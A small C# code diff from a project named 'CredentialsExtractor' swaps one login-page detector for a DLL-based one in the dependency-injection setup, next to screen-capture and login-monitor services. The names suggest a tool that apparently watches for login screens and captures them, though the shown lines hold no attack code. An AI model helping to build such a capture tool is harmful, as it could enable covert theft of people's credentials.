@@ -27,7 +27,9 @@ namespace CredentialsExtractor.DependencyInjection
 
             // Register capture and detection services
             RegisterService<IScreenCapture>(new ScreenCapture(config, GetService<ILogger>()));
-            RegisterService<ILoginPageDetector>(new ExternalProcessLoginDetector(config, GetService<ILogger>()));
+
+            // Use DllLoginDetector instead of ExternalProcessLoginDetector
+            RegisterService<ILoginPageDetector>(new DllLoginDetector(config, GetService<ILogger>(), 0.6));
 
             // Register monitor
             RegisterService<ILoginMonitor>(new LoginMonitor(
